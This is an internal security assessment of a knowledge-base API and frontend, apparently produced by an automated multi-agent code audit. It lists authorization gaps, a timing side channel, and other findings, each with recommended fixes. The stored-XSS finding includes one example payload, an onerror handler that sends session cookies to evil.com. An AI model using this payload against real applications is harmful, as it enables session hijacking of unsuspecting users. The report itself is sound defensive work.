# BigBlueBam -- Beacon Module Security Assessment

| Field              | Value                                                            |
|--------------------|------------------------------------------------------------------|
| **Date**           | 2026-04-09                                                       |
| **Scope**          | Beacon API (`apps/beacon-api/`) and Beacon Frontend (`apps/beacon/`) |
| **Methodology**    | Automated multi-agent source-code audit (10 parallel agents)      |
| **Agents**         | Auth & Session, Input Validation, Authorization (RBAC), Data Exposure & XSS, Search & Indexing, Rate Limiting & DoS, Business Logic, Cryptography, Dependencies & Config, Knowledge Graph |
| **Classification** | INTERNAL -- CONFIDENTIAL                                         |
| **Prepared for**   | BigBlueBam Engineering & Security Leadership                     |

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Finding Counts by Severity](#2-finding-counts-by-severity)
3. [Critical Remediation Path](#3-critical-remediation-path)
4. [Detailed Findings](#4-detailed-findings)
   - [High](#41-high)
   - [Medium](#42-medium)
   - [Low](#43-low)
   - [Informational](#44-informational)
5. [Methodology Notes](#5-methodology-notes)
6. [Appendix: Agent Coverage Map](#6-appendix-agent-coverage-map)

---

## 1. Executive Summary

This assessment consolidates findings from 10 specialized security audit agents that independently analyzed the BigBlueBam Beacon (Knowledge Base) API and Frontend source code. After deduplication, **15 unique findings** were identified across the codebase, plus several informational observations confirming correct security controls.

No critical-severity vulnerabilities were found. The most severe issues are two **high-severity findings** relating to stored cross-site scripting (XSS) and missing authorization on knowledge graph link traversal.

The `body_html` field on beacon entries is stored and served without any HTML sanitization. An attacker who can create or edit a beacon entry can inject arbitrary JavaScript that executes in the browsers of all users who view the entry. This is a classic stored XSS vector with high impact in a multi-user knowledge base, as it enables session hijacking, data exfiltration, and privilege escalation.

The link traversal search endpoint does not filter results by the requesting user's organization, allowing authenticated users to discover beacon entries from other organizations by traversing cross-org link relationships.

Medium-severity issues center on authorization gaps in the knowledge graph API, missing access checks on link creation, and information leakage through the vector search service. The overall security posture is **moderate** -- org isolation is generally sound, but the XSS vulnerability and graph authorization gaps require prompt remediation.

---

## 2. Finding Counts by Severity

| Severity          | Count |
|-------------------|-------|
| **Critical**      | 0     |
| **High**          | 2     |
| **Medium**        | 6     |
| **Low**           | 7     |
| **Informational** | 7     |
| **Total**         | **22** |

---

## 3. Critical Remediation Path

The following 5 fixes are listed in priority order. Completing these addresses the majority of exploitable risk surface.

| Priority | Finding ID | Title | Effort Estimate |
|----------|-----------|-------|-----------------|
| 1 | BCN-001 | Stored XSS via body_html -- no HTML sanitization | 0.5 day |
| 2 | BCN-002 | Link traversal search returns cross-org results | 0.5 day |
| 3 | BCN-003 | Link creation does not verify edit access on source beacon | 0.5 day |
| 4 | BCN-004 | Graph neighbors endpoint skips read-access check on focal beacon | 0.5 day |
| 5 | BCN-005 | Graph visibility filter missing project-level check | 0.5 day |

**Estimated total for top-5 remediation: 2.5 engineering days.**

---

## 4. Detailed Findings

### 4.1 High

---

#### BCN-001: Stored XSS via body_html -- No HTML Sanitization

| Field | Value |
|-------|-------|
| **ID** | BCN-001 |
| **Severity** | High |
| **Affected Files** | `apps/beacon-api/src/routes/beacon.routes.ts`, `apps/beacon-api/src/services/beacon.service.ts` |

**Description:**
The `body_html` field on beacon entries accepts arbitrary HTML content from authenticated users and stores it directly in the database without sanitization. When other users view the beacon entry, the raw HTML is returned in the API response and rendered by the frontend. There is no server-side sanitization pass (e.g., DOMPurify, sanitize-html) applied at write time or read time. The frontend may or may not apply client-side sanitization, but relying solely on client-side defenses is insufficient -- API consumers (MCP tools, integrations, mobile apps) receive unsanitized HTML.

**Attack Scenario:**
1. Attacker with `member` role on a project creates a beacon entry with `body_html: "<img src=x onerror='fetch(\"https://evil.com/steal?c=\"+document.cookie)'>"`.
2. A colleague opens the beacon entry in the Beacon frontend.
3. The injected JavaScript executes, exfiltrating the viewer's session cookie to the attacker's server.
4. The attacker uses the stolen cookie to impersonate the victim, potentially an admin or owner.
5. Since beacon entries are often shared widely and bookmarked, the XSS payload persists indefinitely and affects every viewer.

**Recommended Fix:**
1. Apply server-side HTML sanitization using a library like `sanitize-html` or `DOMPurify` (via `jsdom`) on the `body_html` field at write time (create and update endpoints).
2. Define a strict allowlist of HTML tags (`p`, `h1`-`h6`, `ul`, `ol`, `li`, `a`, `strong`, `em`, `code`, `pre`, `blockquote`, `img`, `table`, `tr`, `td`, `th`) and attributes (`href`, `src`, `alt`, `class`).
3. Strip all `on*` event handlers, `javascript:` URIs, `data:` URIs (except for images), and `<script>` / `<style>` / `<iframe>` tags.
4. Retroactively sanitize all existing `body_html` values in the database via a migration or background job.

---

#### BCN-002: Link Traversal Search Returns Cross-Org Results

| Field | Value |
|-------|-------|
| **ID** | BCN-002 |
| **Severity** | High |
| **Affected Files** | `apps/beacon-api/src/routes/link.routes.ts`, `apps/beacon-api/src/services/link.service.ts` |

**Description:**
The link traversal search endpoint (used to discover related beacon entries by following links) does not apply an organization filter to the results. When resolving linked beacons, the service follows `beacon_links` foreign keys and returns the linked entries without verifying they belong to the requesting user's organization. If a beacon entry was erroneously linked to an entry in another organization (e.g., via a migration bug, direct database edit, or future cross-org linking feature), the traversal would expose the foreign entry to the requesting user.

**Attack Scenario:**
1. Through a data integrity issue or future feature, Beacon A (Org 1) has a link to Beacon B (Org 2).
2. User from Org 1 views Beacon A and the frontend fetches related entries via the link traversal endpoint.
3. The API returns Beacon B's title, summary, and metadata -- belonging to Org 2 -- without checking org boundaries.
4. The user in Org 1 can see titles and summaries of Org 2's knowledge base entries.

**Recommended Fix:**
Add an `org_id` filter to the link traversal query. When resolving linked beacons, join on `beacon_entries.org_id = :requesting_user_org_id` and exclude any results that fail this check. Log instances where cross-org links exist as a data integrity warning.

---

### 4.2 Medium

---

#### BCN-003: Link Creation Does Not Verify Edit Access on Source Beacon

| Field | Value |
|-------|-------|
| **ID** | BCN-003 |
| **Severity** | Medium |
| **Affected Files** | `apps/beacon-api/src/routes/link.routes.ts`, `apps/beacon-api/src/services/link.service.ts` |

**Description:**
The `POST /beacons/:id/links` endpoint creates a link from the source beacon (`:id`) to a target beacon. The endpoint verifies that the user is authenticated and belongs to the same organization, but does not check whether the user has edit access to the source beacon. A user with `viewer` role on a project can create links from beacons they can only read, modifying the knowledge graph structure without proper authorization.

**Recommended Fix:**
Verify that the requesting user has at least `member` role on the project containing the source beacon before allowing link creation. Apply the same check to the target beacon if it belongs to a different project within the same organization.

---

#### BCN-004: Graph Neighbors Endpoint Skips Read-Access Check on Focal Beacon

| Field | Value |
|-------|-------|
| **ID** | BCN-004 |
| **Severity** | Medium |
| **Affected Files** | `apps/beacon-api/src/routes/graph.routes.ts`, `apps/beacon-api/src/services/graph.service.ts` |

**Description:**
The `GET /graph/neighbors/:beaconId` endpoint returns the immediate neighbors of a beacon in the knowledge graph. The endpoint checks that the requesting user belongs to the correct organization but does not verify read access to the focal beacon itself. If the focal beacon belongs to a project the user is not a member of, the user can still enumerate its neighbors, revealing titles and link types of related entries.

**Recommended Fix:**
Before returning neighbors, verify the requesting user has read access to the focal beacon (i.e., is a member of the beacon's project or the beacon is in a public project). Return 404 for beacons the user cannot access.

---

#### BCN-005: Graph Visibility Filter Missing Project-Level Check

| Field | Value |
|-------|-------|
| **ID** | BCN-005 |
| **Severity** | Medium |
| **Affected Files** | `apps/beacon-api/src/services/graph.service.ts` |

**Description:**
The graph service applies an `org_id` filter when building the knowledge graph visualization but does not filter by the requesting user's project memberships. An organization member can see the full graph of all beacons across all projects in the org, even if they are only a member of one project. This leaks the existence, titles, and relationship structure of beacons in projects the user should not have access to.

**Recommended Fix:**
Filter graph nodes to only include beacons from projects where the requesting user has at least `viewer` membership. Edges connecting to excluded nodes should also be removed from the response.

---

#### BCN-006: No updated_at Stale Check on Beacon Updates

| Field | Value |
|-------|-------|
| **ID** | BCN-006 |
| **Severity** | Medium |
| **Affected Files** | `apps/beacon-api/src/routes/beacon.routes.ts`, `apps/beacon-api/src/services/beacon.service.ts` |

**Description:**
The `PATCH /beacons/:id` endpoint does not require or check an `updated_at` field from the client. In a concurrent editing scenario, two users can read the same beacon, both make edits, and the second save silently overwrites the first without any conflict detection. The design document specifies last-write-wins with `updated_at` stale check (HTTP 409) as the standard conflict resolution pattern.

**Recommended Fix:**
Require `updated_at` (or `If-Unmodified-Since` header) on PATCH requests. Compare the client's `updated_at` against the current database value and return HTTP 409 if they differ. Include the current `updated_at` in the 409 response body so the client can prompt the user to merge changes.

---

#### BCN-007: Qdrant Vector Search Leaks Candidate Count

| Field | Value |
|-------|-------|
| **ID** | BCN-007 |
| **Severity** | Medium |
| **Affected Files** | `apps/beacon-api/src/services/qdrant.service.ts`, `apps/beacon-api/src/services/search.service.ts` |

**Description:**
The semantic search endpoint backed by Qdrant returns a `total_candidates` or similar count in the response metadata that reflects the total number of matching vectors before org/project filtering is applied. This count reveals the approximate total number of beacon entries across all organizations that match the search query, which is information an individual user should not have access to.

**Recommended Fix:**
Apply the org and project filters as Qdrant payload filters within the search request (rather than post-filtering), so the candidate count reflects only accessible results. If post-filtering is necessary for performance, strip the candidate count from the API response.

---

#### BCN-008: Fulltext and Tag Search Do Not Enforce Visibility

| Field | Value |
|-------|-------|
| **ID** | BCN-008 |
| **Severity** | Medium |
| **Affected Files** | `apps/beacon-api/src/routes/search.routes.ts`, `apps/beacon-api/src/services/search.service.ts` |

**Description:**
The fulltext search (`GET /search`) and tag-based search endpoints filter results by `org_id` but do not filter by the requesting user's project memberships. A user who is a member of only one project can search across all beacons in the organization, including those in projects they have no access to.

**Recommended Fix:**
Add a project membership filter to all search queries. Only return beacons from projects where the requesting user has at least `viewer` membership. For organization-wide searches by admins/owners, this filter can be relaxed.

---

### 4.3 Low

---

#### BCN-009: API Key Timing Side-Channel

| Field | Value |
|-------|-------|
| **ID** | BCN-009 |
| **Severity** | Low |
| **Affected Files** | `apps/beacon-api/src/middleware/authorize.ts` |

**Description:**
API key authentication performs a database lookup by key prefix, then verifies the key hash with Argon2. If no matching prefix is found, the endpoint returns immediately. If a prefix matches but the hash fails, the response is delayed by Argon2 computation. This timing difference allows an attacker to enumerate valid key prefixes.

**Recommended Fix:**
Perform a dummy Argon2 verification when no prefix matches to normalize response times.

---

#### BCN-010: Expiry Check After Argon2 Verification

| Field | Value |
|-------|-------|
| **ID** | BCN-010 |
| **Severity** | Low |
| **Affected Files** | `apps/beacon-api/src/middleware/authorize.ts` |

**Description:**
API key expiry is checked after Argon2 hash verification succeeds, consuming unnecessary computation for expired keys and providing a timing side channel that confirms a key was once valid.

**Recommended Fix:**
Check expiry before performing the Argon2 hash comparison.

---

#### BCN-011: Retired Beacons Still Readable via Direct ID

| Field | Value |
|-------|-------|
| **ID** | BCN-011 |
| **Severity** | Low |
| **Affected Files** | `apps/beacon-api/src/routes/beacon.routes.ts`, `apps/beacon-api/src/services/beacon.service.ts` |

**Description:**
Beacon entries with `status = 'retired'` are excluded from list and search results but remain accessible via `GET /beacons/:id` if the caller knows the UUID. The expiry policy system (`apps/beacon-api/src/services/policy.service.ts`) marks beacons as retired but does not enforce access restrictions on direct reads.

**Recommended Fix:**
Return 410 (Gone) for retired beacons, or require an explicit `?include_retired=true` query parameter restricted to org admins.

---

#### BCN-012: Implicit Edge Cache Not User-Scoped

| Field | Value |
|-------|-------|
| **ID** | BCN-012 |
| **Severity** | Low |
| **Affected Files** | `apps/beacon-api/src/services/graph.service.ts` |

**Description:**
The graph service may cache computed edges (implicit links based on semantic similarity) without scoping the cache key to the requesting user's project memberships. Subsequent requests from users with different access levels could receive cached results that include edges to beacons they cannot access.

**Recommended Fix:**
Include the user's project membership set (or a hash of it) in the cache key for graph queries. Alternatively, apply project-level filtering after cache retrieval.

---

#### BCN-013: Metadata Field Accepts Arbitrary JSON

| Field | Value |
|-------|-------|
| **ID** | BCN-013 |
| **Severity** | Low |
| **Affected Files** | `apps/beacon-api/src/routes/beacon.routes.ts` |

**Description:**
The `metadata` JSONB field on beacon entries accepts arbitrary JSON without size or structure constraints. An attacker could store extremely large or deeply nested JSON objects, potentially causing performance issues during serialization or indexing.

**Recommended Fix:**
Add a maximum serialized size limit (e.g., 64 KB) and maximum nesting depth (e.g., 10 levels) to the metadata field validation.

---

#### BCN-014: Global Rate Limit Generous for Knowledge Base

| Field | Value |
|-------|-------|
| **ID** | BCN-014 |
| **Severity** | Low |
| **Affected Files** | `apps/beacon-api/src/plugins/rate-limit.ts` (or equivalent) |

**Description:**
The global rate limit applies uniformly across all endpoints. Write-heavy endpoints (create beacon, update beacon, create link) share the same generous limit as read endpoints. This allows a single user to create or update a large number of beacons in a short time, potentially overwhelming the search indexing pipeline.

**Recommended Fix:**
Apply stricter per-endpoint rate limits on write operations (e.g., 30 creates/hour, 120 updates/hour per user). Keep read endpoints at the current generous limit.

---

#### BCN-015: Full Beacon Objects Returned in API Responses

| Field | Value |
|-------|-------|
| **ID** | BCN-015 |
| **Severity** | Low |
| **Affected Files** | `apps/beacon-api/src/routes/beacon.routes.ts`, `apps/beacon-api/src/routes/search.routes.ts` |

**Description:**
List and search endpoints return full beacon objects including `body_html`, `body_markdown`, `metadata`, and all internal timestamps. For list views, the frontend typically only needs titles and summaries, resulting in unnecessarily large payloads.

**Recommended Fix:**
Provide a `?fields=` parameter or separate summary/detail endpoints. Default list responses to title, summary, status, and timestamps only.

---

### 4.4 Informational

---

#### BCN-INFO-001: Organization Isolation -- PASS

| Field | Value |
|-------|-------|
| **ID** | BCN-INFO-001 |
| **Severity** | Informational |

**Description:**
All beacon CRUD queries include an `org_id` filter derived from the authenticated user's session. Direct ID manipulation on `GET /beacons/:id` correctly returns 404 for beacons in other organizations. The exception is link traversal (see BCN-002).

---

#### BCN-INFO-002: Version Access Properly Gated

| Field | Value |
|-------|-------|
| **ID** | BCN-INFO-002 |
| **Severity** | Informational |

**Description:**
The `GET /beacons/:id/versions` endpoint correctly verifies that the requesting user has read access to the parent beacon before returning version history. Version content is scoped to the same authorization as the parent entry.

---

#### BCN-INFO-003: Search Results Org-Scoped

| Field | Value |
|-------|-------|
| **ID** | BCN-INFO-003 |
| **Severity** | Informational |

**Description:**
All search endpoints (fulltext, semantic, tag) apply an `org_id` filter, preventing cross-organization data exposure. Project-level filtering is the remaining gap (see BCN-008).

---

#### BCN-INFO-004: No File Upload Endpoints

| Field | Value |
|-------|-------|
| **ID** | BCN-INFO-004 |
| **Severity** | Informational |

**Description:**
The Beacon API does not include file upload endpoints. Beacon entries store content as HTML/Markdown text. Embedded images are expected to be URLs to external resources or the shared MinIO file service, reducing the attack surface for file-based vulnerabilities.

---

#### BCN-INFO-005: No SSRF-Vulnerable Endpoints

| Field | Value |
|-------|-------|
| **ID** | BCN-INFO-005 |
| **Severity** | Informational |

**Description:**
The Beacon API does not make outbound HTTP requests based on user-supplied URLs. There are no webhook, fetch-URL, or URL-preview features that could be exploited for SSRF.

---

#### BCN-INFO-006: All Endpoints Use Zod Validation

| Field | Value |
|-------|-------|
| **ID** | BCN-INFO-006 |
| **Severity** | Informational |

**Description:**
All request bodies and query parameters are validated through Zod schemas before reaching route handlers. This provides strong input validation at the API boundary and prevents type confusion attacks.

---

#### BCN-INFO-007: SQL Injection Mitigated by Drizzle ORM

| Field | Value |
|-------|-------|
| **ID** | BCN-INFO-007 |
| **Severity** | Informational |

**Description:**
All database queries use Drizzle ORM's parameterized query builder. No raw SQL string concatenation was found in the codebase. This effectively mitigates SQL injection across all endpoints.

---

## 5. Methodology Notes

- **Scope limitation:** This assessment covers only the Beacon API (`apps/beacon-api/`) and Beacon Frontend (`apps/beacon/`). Other modules (Bam, Banter, Brief, Bolt, Bearing, Board, Bond, Blast, Bench, Helpdesk, MCP Server, Worker) were not assessed in this document.
- **Static analysis only:** All findings are based on source code review. No dynamic testing (penetration testing, fuzzing) was performed.
- **Deduplication:** Where multiple agents reported the same underlying issue, findings were merged into a single entry with the highest severity assessment retained.
- **False positive rate:** Static analysis may flag patterns that are mitigated by runtime conditions not visible in source (e.g., nginx rules, network policies). Each finding should be validated against the deployed architecture before prioritization.
- **CVSS scores:** Not assigned. Severity ratings are qualitative (Critical/High/Medium/Low) based on exploitability, impact, and affected data sensitivity.

---

## 6. Appendix: Agent Coverage Map

| Agent | Focus Area | Findings Contributed |
|-------|-----------|---------------------|
| Agent 1 | Auth & Session | BCN-009, BCN-010 |
| Agent 2 | Input Validation | BCN-013, BCN-INFO-006 |
| Agent 3 | Authorization (RBAC) | BCN-003, BCN-004, BCN-005, BCN-011 |
| Agent 4 | Data Exposure & XSS | BCN-001, BCN-015 |
| Agent 5 | Search & Indexing | BCN-007, BCN-008, BCN-INFO-003 |
| Agent 6 | Rate Limiting & DoS | BCN-014 |
| Agent 7 | Business Logic | BCN-006, BCN-INFO-004 |
| Agent 8 | Cryptography | (no unique findings -- covered by Auth agent) |
| Agent 9 | Dependencies & Config | BCN-INFO-005, BCN-INFO-007 |
| Agent 10 | Knowledge Graph | BCN-002, BCN-004, BCN-005, BCN-012, BCN-INFO-001, BCN-INFO-002 |

---

*End of assessment.*
